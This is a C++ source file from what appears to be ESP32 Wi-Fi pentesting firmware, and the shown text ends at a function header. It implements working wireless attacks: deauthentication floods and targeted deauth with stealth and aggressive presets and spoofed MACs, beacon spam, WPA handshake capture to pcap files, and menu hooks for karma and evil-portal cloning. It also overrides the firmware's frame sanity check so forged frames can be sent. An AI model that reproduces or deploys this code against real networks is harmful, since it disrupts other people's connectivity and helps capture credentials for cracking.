// Borrowed from https://github.com/justcallmekoko/ESP32Marauder/
// Learned from https://github.com/risinek/esp32-wifi-penetration-tool/
// Arduino IDE needs to be tweeked to work, follow the instructions:
// https://github.com/justcallmekoko/ESP32Marauder/wiki/arduino-ide-setup But change the file in:
// C:\Users\<YOur User>\AppData\Local\Arduino15\packages\m5stack\hardware\esp32\2.0.9
// Latest update and enhancements on April 11 2025 by Ninja-jr
#include "wifi_atks.h"
#include "core/display.h"
#include "core/main_menu.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "core/utils.h"
#include "core/wifi/webInterface.h"
#include "core/wifi/wifi_common.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "evil_portal.h"
#include "karma_attack.h"
#include "sniffer.h"
#include "vector"
#include <Arduino.h>
#include <globals.h>
#include <nvs_flash.h>

#define WIFI_ATK_NAME "BruceAttack"
extern bool showHiddenNetworks;

// Broadcast MAC for flood attacks
const uint8_t _default_target[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

std::vector<wifi_ap_record_t> ap_records;

// Attack presets
enum DeauthPreset {
    PRESET_NORMAL,
    PRESET_STEALTH,
    PRESET_AGGRESSIVE
};

static DeauthPreset current_preset = PRESET_NORMAL;

// Device deauth sniffing globals
static std::vector<uint8_t> sniffed_clients;
static uint8_t sniff_target_bssid[6];
static volatile bool sniffing_active = false;

/**
 * @brief Decomplied function that overrides original one at compilation time.
 *
 * @attention This function is not meant to be called!
 * @see Project with original idea/implementation https://github.com/GANESH-ICMC/esp32-deauther
 */
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    if (arg == 31337) return 1;
    else return 0;
}

uint8_t deauth_frame[sizeof(deauth_frame_default)]; // 26 = [sizeof(deauth_frame_default[])]

wifi_ap_record_t ap_record;

// Beacon packet template
// clang-format off
constexpr size_t BEACON_PKT_LEN = 109;
const uint8_t beaconPacketTemplate[BEACON_PKT_LEN] = {
    /*  0 - 3  */ 0x80, 0x00, 0x00, 0x00, // Type/Subtype: management beacon frame
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
    /* 10 - 15 */ 0x01, 0x02,  0x03, 0x04, 0x05, 0x06, // Source (placeholder - overwritten)
    /* 16 - 21 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID (placeholder - overwritten)
    /* 22 - 23 */ 0x00, 0x00, // Fragment & sequence number (SDK will set)
    /* 24 - 31 */ 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, // Timestamp
    /* 32 - 33 */ 0xe8, 0x03, // Interval (1s)
    /* 34 - 35 */ 0x31, 0x00, // Capability info (will set WPA flag later)
    /* 36 - 37 */ 0x00, 0x20,         // Tag: SSID parameter set, tag length 32 (we will write SSID into bytes 38..69)
    /* 38 - 69 */ 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // SSID
                  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // SSID
                  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // SSID
                  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // SSID
    /* 70 - 71 */ 0x01, 0x08, // Supported rates tag length 8
    /* 72 */ 0x82,
    /* 73 */ 0x84,
    /* 74 */ 0x8b,
    /* 75 */ 0x96,
    /* 76 */ 0x24,
    /* 77 */ 0x30,
    /* 78 */ 0x48,
    /* 79 */ 0x6c,
    /* 80 - 81 */ 0x03, 0x01,          // Current Channel tag
    /* 82 */ 0x01, // Current channel (overwritten)
    /* 83 - 84 */ 0x30, 0x18, // RSN information (start)
    /* 85 - 86 */ 0x01, 0x00,
    /* 87 - 90 */ 0x00, 0x0f, 0xac, 0x02,
    /* 91 - 92 */ 0x02, 0x00,
    /* 93 -100 */ 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04,
    /*101 -102 */ 0x01, 0x00,
    /*103 -106 */ 0x00, 0x0f, 0xac, 0x02,
    /*107 -108 */ 0x00, 0x00
};
// clang-format on

static inline void prepareBeaconPacket(
    uint8_t outPacket[BEACON_PKT_LEN], const uint8_t macAddr[6], const char *ssid, uint8_t ssidLen,
    uint8_t channel, bool setWPAflag = true
) {
    // copy template into a packet
    memcpy(outPacket, beaconPacketTemplate, BEACON_PKT_LEN);

    // write MAC addresses (source and BSSID)
    memcpy(&outPacket[10], macAddr, 6); // Source
    memcpy(&outPacket[16], macAddr, 6); // BSSID

    // ensure SSID slot is cleared (32 bytes) then copy SSID
    memset(&outPacket[38], 0x20, 32); // keep template behavior
    if (ssidLen > 32) ssidLen = 32;
    outPacket[37] = ssidLen; // SSID element length
    if (ssidLen > 0) { memcpy(&outPacket[38], ssid, ssidLen); }

    // set channel and WPA flags
    outPacket[82] = channel;
    outPacket[34] = 0x31;
}

const uint8_t channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11}; // used Wi-Fi channels (available: 1-14)
uint8_t channelIndex = 0;
uint8_t wifi_channel = 1;

void nextChannel() {
    const size_t nChannels = sizeof(channels) / sizeof(channels[0]);
    if (nChannels == 0) return;
    channelIndex = (channelIndex + 1) % nChannels;
    uint8_t ch = channels[channelIndex];
    if (ch >= 1 && ch <= 14) {
        wifi_channel = ch;
        esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);
    }
}

void wifi_complete_cleanup() {
    Serial.println("[WIFI_ATK] Complete WiFi cleanup");
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_stop();
    // DO NOT call esp_wifi_deinit() here - let wifi_common.h handle it
    // esp_wifi_deinit(); // REMOVED
    // esp_wifi_restore(); // REMOVED
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(300);
}

void checkHeap(const char *tag) {
    uint32_t currentHeap = ESP.getFreeHeap();
    Serial.printf("[HEAP] %s - Free: %ld\n", tag, currentHeap);
}

void resetGlobalState() {
    options.clear();
    options.shrink_to_fit();
    SelPress = false;
    EscPress = false;
    PrevPress = false;
    NextPress = false;
    returnToMenu = false;
    tft.fillScreen(bruceConfig.bgColor);
}

/***************************************************************************************
** Function: send_raw_frame
** @brief: Broadcasts deauth frames
***************************************************************************************/
void send_raw_frame(const uint8_t *frame_buffer, int size) {
    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    vTaskDelay(1 / portTICK_RATE_MS);
    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    vTaskDelay(1 / portTICK_PERIOD_MS);
    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    vTaskDelay(1 / portTICK_PERIOD_MS);
}

/***************************************************************************************
** function: wsl_bypasser_send_raw_frame
** @brief: prepare the frame to deploy the attack
***************************************************************************************/
void wsl_bypasser_send_raw_frame(const wifi_ap_record_t *ap_record, uint8_t chan, const uint8_t target[6]) {
    Serial.print("\nPreparing deauth frame to AP -> ");
    for (int j = 0; j < 6; j++) {
        Serial.print(ap_record->bssid[j], HEX);
        if (j < 5) Serial.print(":");
    }
    if (memcmp(target, _default_target, 6) != 0) {
        Serial.print(" and Tgt: ");
        for (int j = 0; j < 6; j++) {
            Serial.print(target[j], HEX);
            if (j < 5) Serial.print(":");
        }
    }

    esp_err_t err;
    err = esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) Serial.println("Error changing channel");
    vTaskDelay(50 / portTICK_PERIOD_MS);
    memcpy(&deauth_frame[4], target, 6); // Client MAC Address for Station Deauth
    memcpy(&deauth_frame[10], ap_record->bssid, 6);
    memcpy(&deauth_frame[16], ap_record->bssid, 6);
}

/***************************************************************************************
** function: wifi_atk_info
** @brief: Open Wifi information screen
***************************************************************************************/
void wifi_atk_info(String tssid, String mac, uint8_t channel) {
    // desenhar a tela
    drawMainBorder();
    tft.setTextColor(bruceConfig.priColor);
    tft.drawCentreString("-=Information=-", tft.width() / 2, 28, SMOOTH_FONT);
    tft.drawString("AP: " + tssid, 10, 48);
    tft.drawString("Channel: " + String(channel), 10, 66);
    tft.drawString(mac, 10, 84);
    tft.drawString("Press " + String(BTN_ALIAS) + " to act", 10, tftHeight - 20);
    vTaskDelay(200 / portTICK_PERIOD_MS);
    SelPress = false;

    while (1) {
        if (check(SelPress)) {
            returnToMenu = false;
            return;
        }
        if (check(EscPress)) {
            returnToMenu = true;
            return;
        }
        vTaskDelay(50 / portTICK_PERIOD_MS);
    }
}
/***************************************************************************************
** function: wifi_atk_setWifi
** @brief: Sets the Minimum Wifi parameters to WiFi Attacks
***************************************************************************************/
bool wifi_atk_setWifi() {
    checkHeap("Wifi atk start");

    if (WiFi.getMode() != WIFI_MODE_NULL) { return true; }

    wifi_complete_cleanup();
    delay(100);

    if (WiFi.getMode() != WIFI_MODE_APSTA) {
        if (!WiFi.mode(WIFI_MODE_APSTA)) {
            displayError("Failed starting WIFI", true);
            return false;
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    if (WiFi.softAPSSID() != bruceConfig.wifiAp.ssid && WiFi.softAPSSID() != WIFI_ATK_NAME) {
        uint8_t randomChannel = random(1, 12);
        if (!WiFi.softAP(WIFI_ATK_NAME, emptyString, randomChannel, 1, 4, false)) {
            displayError("Failed starting  AP Attacker", true);
            return false;
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    return true;
}

/***************************************************************************************
** function: wifi_atk_unsetWifi
** @brief: Sets the Minimum Wifi parameters to WiFi Attacks
***************************************************************************************/
bool wifi_atk_unsetWifi() {
    if (WiFi.softAPSSID() == WIFI_ATK_NAME) {
        if (!WiFi.softAPdisconnect()) {
            displayError("Failed Stopping AP Attacker", true);
            return false;
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    if (WiFi.status() != WL_CONNECTED && WiFi.softAPSSID() != bruceConfig.wifiAp.ssid) wifiDisconnect();

    return true;
}

/***************************************************************************************
** function: target_atk_menu
** @brief: Open menu to choose which AP Attack
***************************************************************************************/
void wifi_atk_menu() {
    resetGlobalState();

    if (WiFi.getMode() == WIFI_MODE_NULL) {
        wifi_complete_cleanup();
        delay(500);
    }

    checkHeap("Wifi menu start");

    bool scanAtks = false;
    options = {
        {"Target Atks",  [&]() { scanAtks = true; }    },
#ifndef LITE_VERSION
        {"Karma Attack", [=]() { karma_setup(); }      },
#endif
        {"Beacon SPAM",  [=]() { beaconAttack(); }     },
        {"Deauth Flood", [=]() { deauthFloodAttack(); }},
        {"Broadcast Deauth", [=]() {
            options = {
                {"Normal Mode",   [=]() { current_preset = PRESET_NORMAL; enhancedBroadcastDeauth(); }},
                {"Stealth Mode",  [=]() { current_preset = PRESET_STEALTH; enhancedBroadcastDeauth(); }},
                {"Aggressive Mode", [=]() { current_preset = PRESET_AGGRESSIVE; enhancedBroadcastDeauth(); }},
                {"Back", []() { returnToMenu = true; }}
            };
            loopOptions(options);
        }},
        {"Device Deauth", [=]() {
            options = {
                {"Normal Mode",   [=]() { current_preset = PRESET_NORMAL; enhancedDeviceDeauth(); }},
                {"Stealth Mode",  [=]() { current_preset = PRESET_STEALTH; enhancedDeviceDeauth(); }},
                {"Aggressive Mode", [=]() { current_preset = PRESET_AGGRESSIVE; enhancedDeviceDeauth(); }},
                {"Back", []() { returnToMenu = true; }}
            };
            loopOptions(options);
        }},
    };
    addOptionToMainMenu();
    loopOptions(options);
    if (!returnToMenu) {
        if (!wifi_atk_setWifi()) return;
    }
    if (scanAtks) {
        int nets;
        displayTextLine("Scanning..");
        // include hidden networks in the scan depending on toggle
        nets = WiFi.scanNetworks(false, showHiddenNetworks);
        ap_records.clear();
        options = {};
        for (int i = 0; i < nets; i++) {
            wifi_ap_record_t record;
            memset(&record, 0, sizeof(record));
            // copy bssid
            memcpy(record.bssid, WiFi.BSSID(i), 6);
            // copy channel/primary
            record.primary = static_cast<uint8_t>(WiFi.channel(i));
            // copy authmode
            record.authmode = static_cast<wifi_auth_mode_t>(WiFi.encryptionType(i));
            // copy ssid bytes into record.ssid (if supported by struct)
            // Ensure safe copy (wifi_ap_record_t typically has ssid[32])
            if (strlen(WiFi.SSID(i).c_str()) > 0) {
                strncpy((char *)record.ssid, WiFi.SSID(i).c_str(), sizeof(record.ssid) - 1);
                record.ssid[sizeof(record.ssid) - 1] = '\0';
            } else {
                // empty -> leave zeroed or explicit empty string
                record.ssid[0] = '\0';
            }

            ap_records.push_back(record);

            String ssid = WiFi.SSID(i);
            int encryptionType = WiFi.encryptionType(i);
            int32_t rssi = WiFi.RSSI(i);
            int32_t ch = WiFi.channel(i);
            String encryptionPrefix = (encryptionType == WIFI_AUTH_OPEN) ? "" : "#";
            String encryptionTypeStr;
            switch (encryptionType) {
                case WIFI_AUTH_OPEN: encryptionTypeStr = "Open"; break;
                case WIFI_AUTH_WEP: encryptionTypeStr = "WEP"; break;
                case WIFI_AUTH_WPA_PSK: encryptionTypeStr = "WPA/PSK"; break;
                case WIFI_AUTH_WPA2_PSK: encryptionTypeStr = "WPA2/PSK"; break;
                case WIFI_AUTH_WPA_WPA2_PSK: encryptionTypeStr = "WPA/WPA2/PSK"; break;
                case WIFI_AUTH_WPA2_ENTERPRISE: encryptionTypeStr = "WPA2/Enterprise"; break;
                default: encryptionTypeStr = "Unknown"; break;
            }

            // if SSID is empty -> indicate hidden
            String displaySSID = ssid;
            if (displaySSID.length() == 0) {
                // show the BSSID so user can recognize it
                displaySSID = "<Hidden SSID> " + WiFi.BSSIDstr(i);
            }

            String optionText = encryptionPrefix + displaySSID + " (" + String(rssi) + "|" +
                                encryptionTypeStr + "|ch." + String(ch) + ")";

            options.push_back({optionText.c_str(), [=]() {
                                   ap_record = ap_records[i];
                                   target_atk_menu(
                                       WiFi.SSID(i).c_str(),
                                       WiFi.BSSIDstr(i),
                                       static_cast<uint8_t>(WiFi.channel(i))
                                   );
                               }});
        }

        addOptionToMainMenu();

        loopOptions(options);
        options.clear();
        ap_records.clear();
        ap_records.shrink_to_fit();
    }
    wifi_atk_unsetWifi();
    checkHeap("Wifi menu end");
}

void deauthFloodAttack() {
    // Stop WebUI before setting WiFi mode for attack
    cleanlyStopWebUiForWiFiFeature();
    resetGlobalState();
    if (!wifi_atk_setWifi()) return;

    int nets;
ScanNets:
    displayTextLine("Scanning..");
    // include hidden networks in the scan depending on toggle
    nets = WiFi.scanNetworks(false, showHiddenNetworks);
    ap_records.clear();
    for (int i = 0; i < nets; i++) {
        wifi_ap_record_t record;
        memset(&record, 0, sizeof(record));
        memcpy(record.bssid, WiFi.BSSID(i), 6);
        record.primary = static_cast<uint8_t>(WiFi.channel(i));
        // copy ssid bytes too
        if (strlen(WiFi.SSID(i).c_str()) > 0) {
            strncpy((char *)record.ssid, WiFi.SSID(i).c_str(), sizeof(record.ssid) - 1);
            record.ssid[sizeof(record.ssid) - 1] = '\0';
        } else {
            record.ssid[0] = '\0';
        }
        ap_records.push_back(record);
    }
    // Prepare deauth frame for each AP record
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));

    uint32_t lastTime = millis();
    uint32_t rescan_counter = millis();
    uint16_t count = 0;
    uint8_t channel = 0;
    drawMainBorderWithTitle("Deauth Flood");
    while (true) {
        for (const auto &record : ap_records) {
            channel = record.primary;
            wsl_bypasser_send_raw_frame(
                &record, record.primary, _default_target
            ); // Sets channel to the same AP
            tft.setCursor(10, tftHeight - 45);
            tft.println("Channel " + String(record.primary) + "    ");
            for (int i = 0; i < 100; i++) {
                send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                count += 3;
                if (EscPress) break;
            }
            if (EscPress) break;
        }
        // Update counter every 2 seconds
        if (millis() - lastTime > 2000) {
            drawMainBorderWithTitle("Deauth Flood");
            tft.setCursor(10, tftHeight - 25);
            tft.print("Frames:               ");
            tft.setCursor(10, tftHeight - 25);
            tft.println("Frames: " + String(count / 2) + "/s   ");
            tft.setCursor(10, tftHeight - 45);
            tft.println("Channel " + String(channel) + "    ");
            count = 0;
            lastTime = millis();
        }
        if (millis() - rescan_counter > 60000) goto ScanNets;

        if (check(EscPress)) break;
    }
    wifi_atk_unsetWifi();
    returnToMenu = true;
}

/***************************************************************************************
** function: capture_handshake
** @brief: Capture handshake for a selected network
**          (redraws only when deauth is sent or when a handshake/EAPOL is captured)
***************************************************************************************/
uint8_t targetBssid[6]; // Just the target AP MAC to pass onto sniff.cpp to filter out EAPOL frames of
                        // unrelated APs
#if !defined(LITE_VERSION)
void capture_handshake(String tssid, String mac, uint8_t channel) {

    // Stop WebUI before setting WiFi mode for handshake capture
    cleanlyStopWebUiForWiFiFeature();

    hsTracker = HandshakeTracker(); // Reset tracker for each new capture

    uint8_t bssid_array[6];
    sscanf(
        mac.c_str(),
        "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
        &bssid_array[0],
        &bssid_array[1],
        &bssid_array[2],
        &bssid_array[3],
        &bssid_array[4],
        &bssid_array[5]
    );

    // Set the target record for deauth
    memcpy(ap_record.bssid, bssid_array, 6);
    memcpy(targetBssid, bssid_array, 6);
    ap_record.primary = channel;

    String encryptionTypeStr = "Unknown";
    for (int i = 0; i < ap_records.size(); i++) {
        if (memcmp(ap_records[i].bssid, bssid_array, 6) == 0) {
            switch (ap_records[i].authmode) {
                case WIFI_AUTH_OPEN: encryptionTypeStr = "Open"; break;
                case WIFI_AUTH_WEP: encryptionTypeStr = "WEP"; break;
                case WIFI_AUTH_WPA_PSK: encryptionTypeStr = "WPA/PSK"; break;
                case WIFI_AUTH_WPA2_PSK: encryptionTypeStr = "WPA2/PSK"; break;
                case WIFI_AUTH_WPA_WPA2_PSK: encryptionTypeStr = "WPA/WPA2/PSK"; break;
                case WIFI_AUTH_WPA2_ENTERPRISE: encryptionTypeStr = "WPA2/Enterprise"; break;
                default: encryptionTypeStr = "Unknown"; break;
            }
            break;
        }
    }

    // Sanitize SSID for use in filename
    String sanitizedSsid = "";
    for (size_t i = 0; i < tssid.length() && i < 32; ++i) {
        char c = tssid[i];
        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '-' ||
            c == '_' || c == '.') {
            sanitizedSsid += c;
        } else {
            sanitizedSsid += '_';
        }
    }
    // If SSID was hidden/empty, use BSSID appended to filename so it's unique and descriptive
    if (sanitizedSsid.length() == 0) {
        char bssidHex[32];
        sprintf(
            bssidHex,
            "%02X%02X%02X%02X%02X%02X",
            bssid_array[0],
            bssid_array[1],
            bssid_array[2],
            bssid_array[3],
            bssid_array[4],
            bssid_array[5]
        );
        sanitizedSsid = String("HIDDEN_") + String(bssidHex);
    }

    char hsFileName[128];
    sprintf(
        hsFileName,
        "/BrucePCAP/handshakes/HS_%02X%02X%02X%02X%02X%02X_%s.pcap",
        bssid_array[0],
        bssid_array[1],
        bssid_array[2],
        bssid_array[3],
        bssid_array[4],
        bssid_array[5],
        sanitizedSsid.c_str()
    );

    bool hsExists = false;
    FS *fs;
    if (setupSdCard()) {
        fs = &SD;
        isLittleFS = false;
        if (!SD.exists("/BrucePCAP/handshakes")) {
            SD.mkdir("/BrucePCAP");
            SD.mkdir("/BrucePCAP/handshakes");
        }
        hsExists = SD.exists(hsFileName);
    } else {
        fs = &LittleFS;
        isLittleFS = true;
        if (!LittleFS.exists("/BrucePCAP/handshakes")) {
            LittleFS.mkdir("/BrucePCAP");
            LittleFS.mkdir("/BrucePCAP/handshakes");
        }
        hsExists = LittleFS.exists(hsFileName);
    }

    // Register the file path so the sniffer knows to save the capture to it
    String hsFilePath = String(hsFileName);
    if (!hsExists) {
        File hsFile = fs->open(hsFileName, FILE_WRITE);
        if (hsFile) {
            writeHeader(hsFile);
            hsFile.close();
            // Register using the file path
            SavedHS.insert(hsFilePath);
            // Mark as ready to capture
            uint64_t apKey = 0;
            for (int i = 0; i < 6; ++i) { apKey = (apKey << 8) | bssid_array[i]; }
            markHandshakeReady(apKey);
            Serial.println("Created new handshake file for target AP");
            Serial.print("Target BSSID: ");
            for (int i = 0; i < 6; i++) {
                Serial.printf("%02X", bssid_array[i]);
                if (i < 5) Serial.print(":");
            }
            Serial.println();
            Serial.println("Added to SavedHS set for beacon capture");
        } else {
            Serial.println("Failed to create handshake file");
        }
    } else {
        // File already exists: Add to SavedHS and mark as captured
        SavedHS.insert(hsFilePath);
        uint64_t apKey = 0;
        for (int i = 0; i < 6; ++i) { apKey = (apKey << 8) | bssid_array[i]; }
        markHandshakeReady(apKey);
        Serial.println("Handshake file already exists");
    }

    checkHeap("Handshake start");

    wifi_complete_cleanup();
    delay(100);

    if (!WiFi.mode(WIFI_MODE_STA)) {
        displayError("Failed starting WIFI", true);
        return;
    }
    vTaskDelay(pdMS_TO_TICKS(100));

    // Initialize sniffer backend
    if (!sniffer_prepare_storage(fs, !isLittleFS)) {
        displayError("Sniffer queue error", true);
        return;
    }

    ch = channel;
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(sniffer);
    wifi_second_chan_t secondCh = (wifi_second_chan_t)NULL;
    esp_wifi_set_channel(channel, secondCh);

    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));

    int deauthCount = 0;
    int initialNumEAPOL = num_EAPOL;
    int prevNumEAPOL = initialNumEAPOL;
    bool hasBeacons = false;

    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setTextSize(FM);

    // only redraw when we explicitly need to (deauth sent or handshake captured)
    bool needRedraw = true; // draw once on entry

    while (true) {
        // Check if we have beacons
        BeaconList targetBeacon;
        memcpy(targetBeacon.MAC, bssid_array, 6);
        targetBeacon.channel = channel;
        if (registeredBeacons.find(targetBeacon) != registeredBeacons.end()) { hasBeacons = true; }

        // Redraw whenever new EAPOL Frame arrives
        if (num_EAPOL > prevNumEAPOL) {
            prevNumEAPOL = num_EAPOL;
            needRedraw = true;
        }

        // Mark handshake captured only when we have useable EAPOL Frame pairs
        if (handshakeUsable(hsTracker)) {
            // Handshake is usable
        }

        if (needRedraw) {
            drawMainBorderWithTitle("Handshake Capture");
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            padprintln("");
            padprintln("SSID: " + tssid);
            padprintln("BSSID: " + mac);
            padprintln("Security: " + encryptionTypeStr);
            padprintln("");

            // Show console status
            if (hasBeacons && handshakeUsable(hsTracker)) {
                tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
                padprintln("Status: CAPTURED!");
                padprintln("");
                tft.setTextColor(hsTracker.msg1 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
                padprintln("        EAPOL MSG 1: " + String(hsTracker.msg1 ? "Captured" : "None"));
                tft.setTextColor(hsTracker.msg2 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
                padprintln("        EAPOL MSG 2: " + String(hsTracker.msg2 ? "Captured" : "None"));
                tft.setTextColor(hsTracker.msg3 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
                padprintln("        EAPOL MSG 3: " + String(hsTracker.msg3 ? "Captured" : "None"));
                tft.setTextColor(hsTracker.msg4 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
                padprintln("        EAPOL MSG 4: " + String(hsTracker.msg4 ? "Captured" : "None"));
                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            } else if (hasBeacons) {
                tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
                padprintln("Status: Beacon captured");
                padprintln("");
                tft.setTextColor(hsTracker.msg1 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
                padprintln("        EAPOL MSG 1: " + String(hsTracker.msg1 ? "Captured" : "None"));
                tft.setTextColor(hsTracker.msg2 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
                padprintln("        EAPOL MSG 2: " + String(hsTracker.msg2 ? "Captured" : "None"));
                tft.setTextColor(hsTracker.msg3 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
                padprintln("        EAPOL MSG 3: " + String(hsTracker.msg3 ? "Captured" : "None"));
                tft.setTextColor(hsTracker.msg4 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
                padprintln("        EAPOL MSG 4: " + String(hsTracker.msg4 ? "Captured" : "None"));
                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            } else {
                tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
                padprintln("Status: Waiting...");
                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            }

            padprintln("");
            padprintln("Deauth sent: " + String(deauthCount));
            padprintln("");
            tft.drawRightString(
                "Press " + String(BTN_ALIAS) + " to send deauth", tftWidth - 10, tftHeight - 35, 1
            );
            tft.drawString("Press Back to exit", 10, tftHeight - 20);

            // reset redraw flag
            needRedraw = false;
        }

        // If user presses the select button -> send deauth and request redraw
        if (check(SelPress)) {
            wsl_bypasser_send_raw_frame(&ap_record, channel, _default_target);
            for (int i = 0; i < 5; i++) {
                send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                vTaskDelay(10 / portTICK_PERIOD_MS);
            }
            deauthCount += 5;
            needRedraw = true; // show updated deauth counter
        }

        // Exit condition
        if (check(EscPress)) { break; }

        // small yield so other tasks can run; keeps responsiveness without constant redraw
        vTaskDelay(50 / portTICK_PERIOD_MS);
    }

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    // DO NOT call wifi_complete_cleanup() here - it has esp_wifi_deinit()
    // Just stop WiFi operations
    esp_wifi_stop();
    delay(100);
    returnToMenu = true;
}
#endif
/***************************************************************************************
** function: target_atk_menu
** @brief: Open menu to choose which AP Attack
***************************************************************************************/
void target_atk_menu(String tssid, String mac, uint8_t channel) {
AGAIN:
    options = {
        {"Information",         [=]() { wifi_atk_info(tssid, mac, channel); }      },
        {"Deauth",              [=]() { target_atk(tssid, mac, channel); }         },
#ifndef LITE_VERSION
        {"Capture Handshake",   [=]() { capture_handshake(tssid, mac, channel); }  },
#endif
        {"Clone Portal",        [=]() { EvilPortal(tssid, channel, false, false); }},
        {"Deauth+Clone",        [=]() { EvilPortal(tssid, channel, true, false); } },
        {"Deauth+Clone+Verify",
         [=]() // New WiFi Attack
         { EvilPortal(tssid, channel, true, true); }                               },
    };
    addOptionToMainMenu();

    loopOptions(options);
    if (!returnToMenu) goto AGAIN;
}

// Helper functions for enhanced deauth
static void generateRandomMAC(uint8_t *mac) {
    esp_fill_random(mac, 6);
    mac[0] = (mac[0] & 0xFE) | 0x02;
}

static void buildDeauthFrame(uint8_t *frame, const uint8_t *dest, const uint8_t *src,
                              const uint8_t *bssid, uint8_t reason, bool is_disassoc) {
    frame[0] = is_disassoc ? 0xA0 : 0xC0;
    frame[1] = 0x00;
    frame[2] = 0x00;
    frame[3] = 0x00;
    memcpy(&frame[4], dest, 6);
    memcpy(&frame[10], src, 6);
    memcpy(&frame[16], bssid, 6);
    static uint16_t seq = 0;
    seq = random(0, 4096);
    frame[22] = (seq >> 4) & 0xFF;
    frame[23] = ((seq & 0x0F) << 4);
    frame[24] = reason;
    frame[25] = 0x00;
}

static bool initMonitorMode(uint8_t channel) {
    wifi_mode_t current_mode;
    esp_wifi_get_mode(&current_mode);
    esp_wifi_stop();
    delay(5);
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_mode(WIFI_MODE_STA);
    wifi_promiscuous_filter_t filter = {.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL};
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous(true);
    if (esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE) != ESP_OK) {
        esp_wifi_set_promiscuous(false);
        esp_wifi_set_mode(current_mode);
        esp_wifi_start();
        return false;
    }
    esp_wifi_set_max_tx_power(78);
    return true;
}

static void deauth_preset_config(int *packets_per_mac, int *delay_ms, bool *spoofing) {
    switch(current_preset) {
        case PRESET_STEALTH:
            *packets_per_mac = 20;
            *delay_ms = 5;
            *spoofing = true;
            break;
        case PRESET_AGGRESSIVE:
            *packets_per_mac = 100;
            *delay_ms = 0;
            *spoofing = false;
            break;
        default:
            *packets_per_mac = 50;
            *delay_ms = 2;
            *spoofing = true;
            break;
    }
}

// Sniffer callback for device deauth
static void device_deauth_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!sniffing_active) return;
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
    
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    
    if (len < 24) return;
    
    // Extract source MAC (client) and destination MAC (AP)
    const uint8_t *src_mac = &frame[10];
    const uint8_t *dst_mac = &frame[4];
    
    // Check if packet is to/from our target AP
    bool to_target = (memcmp(dst_mac, sniff_target_bssid, 6) == 0);
    bool from_target = (memcmp(src_mac, sniff_target_bssid, 6) == 0);
    
    if (!to_target && !from_target) return;
    
    // Get the client MAC (the one that's not the AP)
    const uint8_t *client_mac = to_target ? src_mac : dst_mac;
    
    // Skip broadcast, multicast, and our own MAC
    if (client_mac[0] == 0xFF && client_mac[1] == 0xFF) return;
    if (client_mac[0] & 0x01) return;
    
    // Add to list if not already present
    for (size_t i = 0; i < sniffed_clients.size(); i += 6) {
        if (memcmp(&sniffed_clients[i], client_mac, 6) == 0) return;
    }
    
    // Add new client
    for (int i = 0; i < 6; i++) sniffed_clients.push_back(client_mac[i]);
}

/***************************************************************************************
** function: target_atk
** @brief: Deploy Target deauth (enhanced with MAC rotation and spoofing)
***************************************************************************************/
